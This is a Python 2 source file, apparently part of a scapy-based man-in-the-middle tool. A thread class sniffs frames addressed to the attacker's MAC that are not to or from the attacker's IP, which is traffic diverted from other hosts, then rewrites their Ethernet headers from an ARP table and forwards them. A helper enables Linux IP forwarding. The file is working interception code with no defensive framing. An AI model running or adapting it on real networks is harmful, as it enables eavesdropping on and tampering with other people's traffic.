import Queue
import threading
import scapy.all as sp
import os
class Mitm_Thread(threading.Thread):
    """
    This  thread is used for sniffing the packets
    and then forwarding them + modfying them
    """
    def __init__(self, info, ):
        self.info = info
        self.stop = threading.Event()
        self.q = Queue.Queue()
        self.forwader = threading.Thread(target=self.pkt_handler)
        super(Mitm_Thread, self).__init__()

    def run(self, ):
        self.stop.set()
        self.forwader.start()
        bpf_filter = '(not (dst host %s or  src host %s)) and ether dst %s' % (self.info.mIP, self.info.mIP, self.info.mac) 
        print bpf_filter
        while self.stop.wait(0):
            sp.sniff(filter=bpf_filter, timeout=5, prn=lambda pkt: self.q.put(pkt))
        
    def pkt_handler( self):
        s = sp.conf.L2socket()
        while 1:
            pkt = self.q.get()
            if pkt == "exit": break
            self.forward(pkt, s, )
            #threading.Thread(target = self.forward, args = (pkt, s, )).start()
        s.close()

    def forward(self, pkt, s, ):
        if pkt.haslayer(sp.IP):
            get_mac = lambda x: self.info.arp_table.get(x, self.info.arp_table[self.info.gIP])
            pkt[sp.Ether].dst = get_mac(pkt[sp.IP].dst)
            pkt[sp.Ether].src = self.info.mac
            s.send(pkt) # equivlant to sp.sendp(pkt)
            # sp.sendp(pkt)
    def close(self, ):
        self.q.put("exit")
        self.stop.clear()
    
def set_ip_forward(f):
    """
    args: f: 0 for off; 1 for on
    returns: None
    only supported by linux systems
    sets ip forwarding in the system
    """
    os.system("echo %s > /proc/sys/net/ipv4/ip_forward" % (f,))